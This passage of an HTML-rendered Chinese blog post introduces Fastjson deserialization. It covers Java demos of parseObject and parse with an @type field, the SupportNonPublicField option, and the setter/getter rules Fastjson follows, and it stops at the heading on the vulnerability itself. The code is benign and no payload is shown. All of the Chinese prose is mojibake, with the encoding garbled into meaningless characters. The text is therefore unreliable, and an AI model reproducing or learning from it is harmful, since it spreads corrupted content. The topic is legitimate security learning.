class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;y0n3er\&quot;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class, Feature.SupportNonPublicField);  </span><br><span class="line">        System.out.println(student);  </span><br><span class="line">        System.out.println(student.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082233527.png" alt="image-20230808223321061"><br>ÁÆÄÂçïÁöÑ‰ª£Á†ÅÂàÜÊûêÁªìÊùüÔºåÁ®çÂæÆ‰∫ÜËß£‰∏ãËøáÁ®ã</li></ul><h2 id="Âè¶Â§ñ‰∏Ä‰∫õÂü∫Á°ÄÁü•ËØÜ"><a href="#Âè¶Â§ñ‰∏Ä‰∫õÂü∫Á°ÄÁü•ËØÜ" class="headerlink" title="Âè¶Â§ñ‰∏Ä‰∫õÂü∫Á°ÄÁü•ËØÜ"></a>Âè¶Â§ñ‰∏Ä‰∫õÂü∫Á°ÄÁü•ËØÜ</h2><p>ÊÑüËßâËøôÈáåÂ∞±ÊòØÂØπÂêéÁª≠ÊºèÊ¥ûÁêÜËß£ÂÅö‰∏™Âü∫Á°ÄÈì∫Âû´</p><h3 id="1-ÂèçÂ∫èÂàóÂåñÊó∂ÁöÑ-Feature-SupportNonPublicField-ÂèÇÊï∞"><a href="#1-ÂèçÂ∫èÂàóÂåñÊó∂ÁöÑ-Feature-SupportNonPublicField-ÂèÇÊï∞" class="headerlink" title="1. ÂèçÂ∫èÂàóÂåñÊó∂ÁöÑ Feature.SupportNonPublicField ÂèÇÊï∞"></a>1. ÂèçÂ∫èÂàóÂåñÊó∂ÁöÑ Feature.SupportNonPublicField ÂèÇÊï∞</h3><p>ÂâçÊñáÊàë‰ª¨Âú®ÂèçÂ∫èÂàóÂåñ‰ª£Á†ÅËøêË°åÁöÑÊó∂ÂÄôÔºåÂèëÁé∞Êàë‰ª¨Âπ∂‰∏çËÉΩËé∑ÂèñÂà∞ ‚Äúage‚Äù Ëøô‰∏™ÂÄºÔºåÂõ†‰∏∫ÂÆÉÊòØÁßÅÊúâÂ±ûÊÄßÁöÑ„ÄÇ</p><ul><li>Â¶ÇÊûúË¶ÅËøòÂéüÂá∫ private ÁöÑÂ±ûÊÄßÁöÑËØùÔºåËøòÈúÄË¶ÅÂú®JSON.parseObject&#x2F;JSON.parse‰∏≠Âä†‰∏äFeature.SupportNonPublicFieldÂèÇÊï∞„ÄÇ</li></ul><p>ËøôÈáåÊîπ‰∏ãStudentÁ±ªÔºåÂ∞ÜÁßÅÊúâÂ±ûÊÄßageÁöÑsetAge()ÂáΩÊï∞Ê≥®ÈáäÊéâÔºà‰∏ÄËà¨Ê≤°‰∫∫‰ºöÁªôÁßÅÊúâÂ±ûÊÄßÂä†setterÊñπÊ≥ïÔºåÂä†‰∫ÜÂ∞±Ê≤°ÂøÖË¶ÅÂ£∞Êòé‰∏∫private‰∫ÜÔºâÁÑ∂Âêé‰øÆÊîπ<code>StudentUnserialize.java</code>ÂéªÊéâFeature.SupportNonPublicFieldÔºåÊ∑ªÂä†ËæìÂá∫‰∏§‰∏™Â±ûÊÄß<code>getter</code>ÊñπÊ≥ïÁöÑËøîÂõûÂÄºÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;y0n3er\&quot;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class);  </span><br><span class="line">        System.out.println(student);  </span><br><span class="line">        System.out.println(student.getClass().getName());  </span><br><span class="line">        System.out.println(student.getName() + <span class="string">&quot; &quot;</span> + student.getAge());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÈáçÊñ∞ËøêË°åÔºå‰ºöÁúãÂà∞Ëé∑Âèñ‰∏çÂà∞ÁßÅÊúâÂèòÈáèageÁöÑÂÄºËÄåÊòØË¢´ËÆæÁΩÆ‰∏∫0Ôºö</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setName</span><br><span class="line">Dome.Student@28c97a5</span><br><span class="line">Dome.Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">y0n3er 0</span><br></pre></td></tr></table></figure><p>Êé•ÁùÄÊ∑ªÂä†Feature.SupportNonPublicFieldÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class,Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>ÂÜçËæìÂá∫Â∞±ËÉΩÊàêÂäüËøòÂéüÂá∫ageËøô‰∏™ÁßÅÊúâÂèòÈáèÁöÑÂÄº‰∫ÜÔºö</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setName</span><br><span class="line">Dome.Student@28c97a5</span><br><span class="line">Dome.Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">y0n3er 6</span><br></pre></td></tr></table></figure><p>‰πüÂ∞±ÊòØËØ¥ÔºåËã•ÊÉ≥ËÆ©‰º†ÁªôJSON.parseObject()ËøõË°åÂèçÂ∫èÂàóÂåñÁöÑJSONÂÜÖÂÆπÊåáÂêëÁöÑÂØπË±°Á±ª‰∏≠ÁöÑÁßÅÊúâÂèòÈáèÊàêÂäüËøòÂéüÂá∫Êù•ÔºåÂàôÈúÄË¶ÅÂú®Ë∞ÉÁî®JSON.parseObject()Êó∂Âä†‰∏äFeature.SupportNonPublicFieldËøô‰∏™Â±ûÊÄßËÆæÁΩÆÊâçË°å„ÄÇ</p><h3 id="2-Âè™ËøõË°å-JSON-parseObject-jsonString"><a href="#2-Âè™ËøõË°å-JSON-parseObject-jsonString" class="headerlink" title="2. Âè™ËøõË°å JSON.parseObject(jsonString)"></a>2. Âè™ËøõË°å JSON.parseObject(jsonString)</h3><p>ÂÜçÊù•Áúã‰∏ãparseObject()ÁöÑÊåáÂÆöÊàñ‰∏çÊåáÂÆöÂèçÂ∫èÂàóÂåñÁ±ªÂûã‰πãÈó¥ÁöÑÂ∑ÆÂºÇ„ÄÇ</p><p>Áî±‰∫éFastjsonÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂà©Áî®Âè™ÂíåÂåÖÂê´‰∫Ü@typeÁöÑJSONÊï∞ÊçÆÊúâÂÖ≥ÔºåÂõ†Ê≠§ËøôÈáåÊàë‰ª¨Âè™ÂØπÂ∫èÂàóÂåñÊó∂ËÆæÁΩÆ‰∫ÜSerializerFeature.WriteClassNameÂç≥Âê´Êúâ@typeÊåáÂÆöÂèçÂ∫èÂàóÂåñÁ±ªÂûãÁöÑJSONÊï∞ÊçÆËøõË°åÂèçÂ∫èÂàóÂåñÔºõÂØπ‰∫éÊú™ÂåÖÂê´@typeÁöÑÊÉÖÂÜµËøôÈáå‰∏çÂÅöÊé¢ËÆ®ÔºåÂèØËá™Ë°åÊµãËØï„ÄÇ<br>ÂÖ≥‰∫éËøô‰∏™@typeÁöÑ‰ΩúÁî®Âú®ÁôΩÊó•Ê¢¶ÁªÑÈïøËßÜÈ¢ë‰∏ãÈù¢ÁúãÂà∞‰∏™ËØÑËÆ∫ÊÑüËßâÊå∫ÂΩ¢Ë±°ÁöÑ</p><blockquote><p>‰∏∫‰ªÄ‰πàË¶ÅÂºïÂÖ•typeÂ±ûÊÄßÔºüÊØîÂ¶ÇÔºåÂº†‰∏âÂ∑•ËµÑ3000ÔºåÂè¶‰∏Ä‰∏™Âè´Âº†‰∏âÁöÑÂ∑•ËµÑ20000Ôºå‰ªñ‰ª¨ÈÉΩÊúâ‰∏Ä‰∏™Á±ªÔºåÂè´‰∫∫Á±ªÔºåÁé∞Âú®ËÄÅÊùøË¶ÅÊãõÂ∑•‰∫∫‰∫ÜÔºå‰Ω†ÊòØÁåéÂ§¥Ôºå‰Ω†Êää‰∏§‰∏™‰∫∫‰ø°ÊÅØÈÉΩÊä•‰∏äÂéª‰∫ÜÔºå‰πüÂ∞±ÊòØÂ∫èÂàóÂåñ‰º†ËøáÂéª‰∫ÜÔºå‰ΩÜÊòØ‰Ω†ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÔºåÂèëÁé∞‰∏§‰∏™‰∫∫ÈÉΩÂè´Âº†‰∏âÔºåÈÇ£‰πàÂì™‰∏™ÊòØ3000Â∑•ËµÑÁöÑÔºåÂì™‰∏™ÊòØ20000Â∑•ËµÑÁöÑÂë¢ÔºåËøôÊó∂ÂÄôÂ∞±‰ºö‰π±ÔºåÊâÄ‰ª•ÂºïÂÖ•‰∫ÜÂéüÂßãÂ±ûÊÄßÔºå‰πüÂ∞±ÊòØ@typeÔºåËøôÊ†∑Â∞±ËÉΩÊâæÂà∞ÂΩíÂ±ûÔºåÂéüÊù•1Á±≥5ÁöÑÂº†‰∏âÂ∑•ËµÑÊòØ3000Ôºå1Á±≥9ÁöÑÂº†‰∏âÂ∑•ËµÑÊòØ20000Ôºå‰ΩÜÊòØÂë¢ÔºåËøô‰∏™@typeÂ±ûÊÄßÂèØ‰ª•ÈöèÊÑèÂ°´ÂÜôÔºåÊ≤°ÊÉ≥Âà∞Â∑•ËµÑ3000ÁöÑÂº†‰∏â‰∏äÈù¢Êúâ‰∫∫ÔºåÁªô‰ªñÂÜô‰∫Ü‰∏™@typeÔºöÊàëÁàπÊòØÊùéÂàöÔºåÊïÖÊ≠§1Á±≥5ÁöÑÂº†‰∏âÊãøÁùÄ10000000000000ÁöÑÂ∑•ËµÑÂÖ•ËÅå‰∫Ü„ÄÇ</p></blockquote><p>ÊÄªÁªìÂ∞±ÊòØÁî®@typeÁªô‰Ω†ÊåáÂÆöË∞ÉÁî®Âì™‰∏™Á±ª‰∏ãÁöÑ <code>setter</code> ÊñπÊ≥ïÂíå <code>getter</code> ÊñπÊ≥ï<br>‰øÆÊîπStudentÁ±ªÔºåÊ∑ªÂä†‰∏§‰∏™privateÊàêÂëòÂèòÈáèÔºå‰∏îÊâÄÊúâÁöÑÁßÅÊúâÊàêÂëòÂèòÈáèÈÉΩ‰∏çÂÆö‰πâsetterÊñπÊ≥ïÔºàÊó¢ÁÑ∂ÊòØprivate‰πüÊ≤°ÂøÖË¶ÅÂÆö‰πâÔºâÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">private</span> String address;  </span><br><span class="line">    <span class="keyword">private</span> Properties properties;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;ÊûÑÈÄ†ÂáΩÊï∞&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> address;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> properties;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰øÆÊîπÂèçÂ∫èÂàóÂåñStudentUnserializeÊñá‰ª∂ÔºåÂÖàÊòØÈªòËÆ§Ë∞ÉÁî®parseObject()‰∏çÂ∏¶ÊåáÂÆöÁ±ªÂûãÁöÑÂèÇÊï∞Ôºö‰πüÂ∞±ÊòØÂè™Êúâ <code>JSON.parseObject(jsonstring)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;Drunkbaby\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString);  </span><br><span class="line">        <span class="comment">// Êàñ‰ª•‰∏ãËØ≠Âè•ÔºåËæìÂá∫ÁªìÊûú‰∏ÄËá¥  </span></span><br><span class="line">        <span class="comment">//JSONObject obj = JSON.parseObject(jsonString);  </span></span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËæìÂá∫ÁúãÂà∞ÔºåË∞ÉÁî®‰∫ÜStudentÁ±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÅÊâÄÊúâÂ±ûÊÄßÁöÑgetterÊñπÊ≥ï„ÄÅJSONÈáåÈù¢ÈùûÁßÅÊúâÂ±ûÊÄßÁöÑsetterÊñπÊ≥ïÔºåÂÖ∂‰∏≠getProperties()Ë∞ÉÁî®‰∫Ü‰∏§Ê¨°ÔºõÊó†ËÆ∫ÂÆö‰πâÁöÑÂØπË±°ÊòØObjectËøòÊòØJSONObjectÔºåÊúÄÂêéÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑÈÉΩÊòØJSONObjectÁ±ªÂØπË±°ÔºåÂèØ‰ª•ÁúãÂà∞ÊòØÊú™ÂèçÂ∫èÂàóÂåñÊàêÂäüÁöÑÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082234896.png" alt="image-20230808223413064"><br>Êé•ÁùÄÂú®StudentUnserialize2.java‰∏≠‰øÆÊîπÂèçÂ∫èÂàóÂåñ‰ª£Á†ÅËØ≠Âè•Â¶Ç‰∏ãÔºåÂä†‰∏äÊåáÂÆöÂèçÂ∫èÂàóÂåñÂæóÂà∞ÁöÑÁ±ªÂûã‰∏∫Object.classÊàñStudent.classÔºåËøôÊ†∑Â∞±ÊòØÊàêÂäüÂèçÂ∫èÂàóÂåñÁöÑÂõûÊòæ„ÄÇ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091125832.png" alt="image-20230809112543959"></p><h3 id="3-parse‰∏éparseObjectÂå∫Âà´"><a href="#3-parse‰∏éparseObjectÂå∫Âà´" class="headerlink" title="3. parse‰∏éparseObjectÂå∫Âà´"></a>3. parse‰∏éparseObjectÂå∫Âà´</h3><p>ÂâçÈù¢ÁöÑdemoÈÉΩÊòØÁî®<code>parseObject()</code>ÊºîÁ§∫ÁöÑÔºåËøòÊ≤°ËØ¥Âà∞<code>parse()</code>„ÄÇ‰∏§ËÄÖ‰∏ªË¶ÅÁöÑÂå∫Âà´Â∞±ÊòØ<code>parseObject()</code>ËøîÂõûÁöÑÊòØJSONObjectËÄå<code>parse()</code>ËøîÂõûÁöÑÊòØÂÆûÈôÖÁ±ªÂûãÁöÑÂØπË±°ÔºåÂΩìÂú®Ê≤°ÊúâÂØπÂ∫îÁ±ªÁöÑÂÆö‰πâÁöÑÊÉÖÂÜµ‰∏ãÔºå‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÈÉΩ‰ºö‰ΩøÁî®<code>JSON.parseObject()</code>Êù•Ëé∑ÂèñÊï∞ÊçÆ„ÄÇ</p><blockquote><p>FastJson‰∏≠ÁöÑ <code>parse()</code> Âíå <code>parseObject()</code> ÊñπÊ≥ïÈÉΩÂèØ‰ª•Áî®Êù•Â∞ÜJSONÂ≠óÁ¨¶‰∏≤ÂèçÂ∫èÂàóÂåñÊàêJavaÂØπË±°Ôºå<code>parseObject()</code> Êú¨Ë¥®‰∏ä‰πüÊòØË∞ÉÁî® <code>parse()</code> ËøõË°åÂèçÂ∫èÂàóÂåñÁöÑ„ÄÇ‰ΩÜÊòØ <code>parseObject()</code> ‰ºöÈ¢ùÂ§ñÁöÑÂ∞ÜJavaÂØπË±°ËΩ¨‰∏∫ JSONObjectÂØπË±°ÔºåÂç≥ <code>JSON.toJSON()</code>„ÄÇÊâÄ‰ª•ËøõË°åÂèçÂ∫èÂàóÂåñÊó∂ÁöÑÁªÜËäÇÂå∫Âà´Âú®‰∫éÔºå<code>parse()</code> ‰ºöËØÜÂà´Âπ∂Ë∞ÉÁî®ÁõÆÊ†áÁ±ªÁöÑ <code>setter</code> ÊñπÊ≥ïÂèäÊüê‰∫õÁâπÂÆöÊù°‰ª∂ÁöÑ <code>getter</code> ÊñπÊ≥ïÔºåËÄå <code>parseObject()</code> Áî±‰∫éÂ§öÊâßË°å‰∫Ü <code>JSON.toJSON(obj)</code>ÔºåÊâÄ‰ª•Âú®Â§ÑÁêÜËøáÁ®ã‰∏≠‰ºöË∞ÉÁî®ÂèçÂ∫èÂàóÂåñÁõÆÊ†áÁ±ªÁöÑÊâÄÊúâ <code>setter</code> Âíå <code>getter</code> ÊñπÊ≥ï„ÄÇ</p></blockquote><p>‰πüÂ∞±ÊòØËØ¥ÔºåÊàë‰ª¨Áî®<code>parse()</code>ÂèçÂ∫èÂàóÂåñ‰ºöÁõ¥Êé•ÂæóÂà∞ÁâπÂÆöÁöÑÁ±ªÔºåËÄåÊó†ÈúÄÂÉè<code>parseObject()</code>‰∏ÄÊ†∑ËøîÂõûÁöÑÊòØJSONObjectÁ±ªÂûãÁöÑÂØπË±°„ÄÅËøòÂèØËÉΩÈúÄË¶ÅÂéªËÆæÁΩÆÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊåáÂÆöËøîÂõûÁâπÂÆöÁöÑÁ±ª„ÄÇ</p><p>‰øÆÊîπÂèçÂ∫èÂàóÂåñËØ≠Âè•‰∏≠ÁöÑ<code>parseObject()</code>‰∏∫<code>parse()</code>Ôºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;y0n3er\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonString, Feature.SupportNonPublicField);  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091126302.png" alt="image-20230809112621604"></p><h3 id="4-ÁÆÄÂçïÊÄªÁªì"><a href="#4-ÁÆÄÂçïÊÄªÁªì" class="headerlink" title="4. ÁÆÄÂçïÊÄªÁªì"></a>4. ÁÆÄÂçïÊÄªÁªì</h3><p>ÁÆÄÂçïÊÄªÁªì‰∏äÈù¢ÁöÑÂ∞±ÊòØÂèçÂ∫èÂàóÂåñÁöÑËØ≠Âè•Â∫îËØ•Ëøô‰πàÂÜô</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;\&quot;name\&quot;:\&quot;y0n3er\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class);</span><br></pre></td></tr></table></figure><p>Ë¶ÅÁî® <code>parseObject</code>ÔºåÈáåÈù¢ÁöÑÂèÇÊï∞ÈúÄË¶ÅÊòØ <code>Object.class</code></p><h2 id="fastjson-ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂéüÁêÜ"><a href="#fastjson-ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂéüÁêÜ" class="headerlink" title="fastjson ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂéüÁêÜ"></a>fastjson ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂéüÁêÜ</h2><p>ËøôÈáåËøòÊòØ‰∏äÈù¢ÁöÑÈÇ£‰∏™ÊÄªÁªìÔºåÊàëÁî®@typeÁªô‰Ω†ÊåáÂÆö‰Ω†Âú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôËá™Âä®Ë∞ÉÁî®Âì™‰∏™Á±ª‰∏ãÁöÑ <code>setter</code> ‰∏é <code>getter</code> ÊñπÊ≥ïÔºåÂΩìÁÑ∂ËøôÈáåÂπ∂‰∏çÊòØÊâÄÊúâÁöÑ <code>setter</code> Âíå <code>getter</code> ÊñπÊ≥ï„ÄÇ<br><strong>‰∏ãÈù¢Áõ¥Êé•ÂºïÁî®ÁªìËÆ∫ÔºåFastjson‰ºöÂØπÊª°Ë∂≥‰∏ãÂàóË¶ÅÊ±ÇÁöÑsetter&#x2F;getterÊñπÊ≥ïËøõË°åË∞ÉÁî®Ôºö</strong><br>Êª°Ë∂≥Êù°‰ª∂ÁöÑsetterÔºö</p><ul><li>ÈùûÈùôÊÄÅÂáΩÊï∞</li><li>ËøîÂõûÁ±ªÂûã‰∏∫voidÊàñÂΩìÂâçÁ±ª</li><li>ÂèÇÊï∞‰∏™Êï∞‰∏∫1‰∏™</li></ul><p>Êª°Ë∂≥Êù°‰ª∂ÁöÑgetterÔºö</p><ul><li>ÈùûÈùôÊÄÅÊñπÊ≥ï</li><li>Êó†ÂèÇÊï∞</li><li><strong>ËøîÂõûÂÄºÁ±ªÂûãÁªßÊâøËá™CollectionÊàñMapÊàñAtomicBooleanÊàñAtomicIntegerÊàñAtomicLong</strong></li></ul><p>ÂâçÈù¢ÁöÑpropertiesÁßÅÊúâÂ±ûÊÄßÔºåÂÖ∂Á±ªÂûã‰∏∫PropertiesÔºåËÄåPropertiesÊòØÁªßÊâø‰∫éHashtableÔºåHashtableÊòØÂÆûÁé∞MapÊé•Âè£Á±ªÁöÑÁ±ªÔºåÂõ†Ê≠§propertiesÁßÅÊúâÂ±ûÊÄßÁöÑ<code>getter</code>ÊñπÊ≥ïÊòØÁªßÊâøËá™MapÔºå‰ªéËÄåËÉΩÂ§üÊàêÂäüË¢´FastjsonË∞ÉÁî®„ÄÇ</p><h3 id="1-ÊºèÊ¥ûÂéüÁêÜ"><a href="#1-ÊºèÊ¥ûÂéüÁêÜ" class="headerlink" title="1. ÊºèÊ¥ûÂéüÁêÜ"></a>1. 